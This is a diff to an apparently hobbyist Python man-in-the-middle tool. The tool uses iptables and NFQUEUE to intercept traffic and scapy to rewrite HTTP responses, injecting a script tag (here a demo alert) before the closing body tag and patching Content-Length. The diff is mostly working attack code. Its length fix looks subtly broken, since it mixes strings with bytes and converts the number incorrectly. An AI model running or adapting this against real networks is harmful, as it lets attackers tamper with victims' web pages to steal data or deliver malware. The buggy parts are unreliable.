@@ -13,7 +13,7 @@
 from subprocess import call
 import netfilterqueue
 import scapy.all as scapy
-from re import sub
+from re import search, sub
 
 ############################### Functions ############################### 
 def forward_packets():
@@ -24,8 +24,8 @@ def forward_packets():
 
     call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
     # for local host
-    # call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
     
 
 
@@ -51,10 +51,10 @@ def set_load(packet, load):
 
 def process_packet(packet):
     '''
-    process received packet, everytime a packet is received.
-    prints the packet received in the queue and it modifies
-    the load value of the packet.
+    process received packet, everytime a packet is received and
+
     '''
+    global inj_code
     scapy_pkt = scapy.IP(packet.get_payload())
     if scapy_pkt.haslayer(scapy.Raw):
 
@@ -73,8 +73,18 @@ def process_packet(packet):
             load = load.replace('</BODY>', '</body>')
             if '</body>' in load:
                 print('\n[+] Script/Code Injected!!\n')
-                tampered_load = load.replace('</body>', '<script>alert("Payload Added!!")</script> \n</body>')
+                tampered_load = load.replace('</body>', inj_code+'</body>')
                 tampered_load = tampered_load.encode('utf-8', 'ignore')
+                print(tampered_load)
+
+                content_len_search = search("(?:Content-Length:\s)(\d*)", load)
+                if content_len_search and b'text/html' in load:
+                    content_len = content_len_search.group(1)
+                    new_content_len = int(content_len) + len(inj_code)
+
+                    tampered_load = sub(b'(?:Content-Length:\s)(\d*)', bytes(new_content_len), tampered_load)
+                print(tampered_load)
+
 
         if load != scapy_pkt[scapy.Raw].load: 
             if tampered_load == b'unchanged load':  
@@ -88,6 +98,8 @@ def process_packet(packet):
     
 
 ############################### Main ############################### 
+
+inj_code = '<script>alert("Payload Added!!")</script>'
 
 reset_config()
 
